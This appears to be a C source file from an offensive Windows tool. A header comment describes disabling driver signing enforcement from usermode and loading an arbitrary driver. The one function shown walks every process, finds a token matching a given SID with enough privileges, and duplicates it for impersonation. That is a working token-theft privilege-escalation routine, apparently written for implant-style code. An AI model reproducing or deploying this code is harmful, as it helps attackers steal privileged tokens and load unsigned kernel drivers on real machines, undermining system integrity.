/**
 *
 * Disables driver signing enforcement from
 * usermode, and loads a requested driver
 * into memory.
 *
 * Do to the lack of a driver and usage of
 * a userland bug, this project remains 
 * closed source.
 *
**/

#include "common.h"

/**
 *
 * Purpose:
 *
 * Locates a token matching the specified SID
 * and checks if it has the available number
 * of privileges.
 *
**/

D_SEC( B ) HANDLE TokenGetTokenWithSidAndPrivilegeCount( _In_ PAPI Api, _In_ PCHAR szSid, _In_ ULONG ulCount ) 
{
	ULONG			Size = 0;

	PSID			uSid = NULL;
	HANDLE			CurP = NULL;
	HANDLE			NxtP = NULL;
	HANDLE			Tokn = NULL;
	HANDLE			Dupd = NULL;
	PTOKEN_USER		User = NULL;

	TOKEN_STATISTICS 	Stat;

	RtlSecureZeroMemory( &Stat, sizeof( Stat ) );

	while ( Api->NtGetNextProcess( CurP, PROCESS_QUERY_INFORMATION, 0, 0, &NxtP ) >= 0 ) {
		if ( CurP != NULL ) {
			Api->NtClose( CurP );
		}; CurP = NxtP;

		if ( Api->NtOpenProcessToken( CurP, TOKEN_QUERY | TOKEN_DUPLICATE, &Tokn ) >= 0 ) {
			if ( ! Api->IsTokenRestricted( Tokn ) ) {
				if ( !( Api->NtQueryInformationToken( Tokn, TokenUser, NULL, 0, &Size ) >= 0 ) ) {
					if ( ( User = Api->LocalAlloc( LPTR, Size ) ) ) {
						if ( Api->NtQueryInformationToken( Tokn, TokenUser, User, Size, &Size ) >= 0 ) {
							if ( Api->ConvertStringSidToSidA( szSid, &uSid ) ) {
								if ( Api->RtlEqualSid( uSid, User->User.Sid ) ) {
									if ( Api->NtQueryInformationToken( Tokn, TokenStatistics, &Stat, sizeof( Stat ), &Size ) >= 0 ) {
										if ( Stat.PrivilegeCount >= ulCount ) {
											Api->DuplicateTokenEx(
												Tokn,
												TOKEN_ALL_ACCESS,
												NULL,
												SecurityImpersonation,
												TokenImpersonation,
												&Dupd
											);
										};
									};
								};
								Api->LocalFree( uSid );
							};
						};
						Api->LocalFree( User );
					};
				};
			};
			Api->NtClose( Tokn );
		};
		if ( Dupd != NULL ) {
			break;
		};
	};
	if ( CurP != NULL ) {
		Api->NtClose( CurP );
	};
	return Dupd;
};
